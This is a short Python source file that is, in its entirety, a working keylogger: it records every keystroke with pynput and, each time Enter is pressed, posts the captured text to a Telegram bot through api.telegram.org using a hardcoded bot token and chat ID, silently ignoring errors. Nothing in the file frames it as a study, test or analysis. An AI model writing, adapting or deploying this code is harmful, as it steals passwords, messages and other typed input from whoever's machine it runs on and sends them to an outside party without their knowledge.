import requests
from pynput.keyboard import Key, Listener

TOKEN = "8985026239:AAFluyNrfR6x6tU6YnmzSdDA1fOtMiHAeYg"
CHAT_ID = "-1004356233671"

buffer = ""

def send_to_telegram(text):
    if text.strip():
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        payload = {"chat_id": CHAT_ID, "text": text}
        try:
            requests.post(url, data=payload)
        except:
            pass

def on_press(key):
    global buffer
    try:
        buffer += key.char
    except AttributeError:
        if key == Key.space:
            buffer += " "
        elif key == Key.enter:
            send_to_telegram(buffer)
            buffer = ""
        elif key == Key.backspace:
            buffer = buffer[:-1]
        elif key == Key.tab:
            buffer += " [TAB] "

with Listener(on_press=on_press) as listener:
    listener.join()
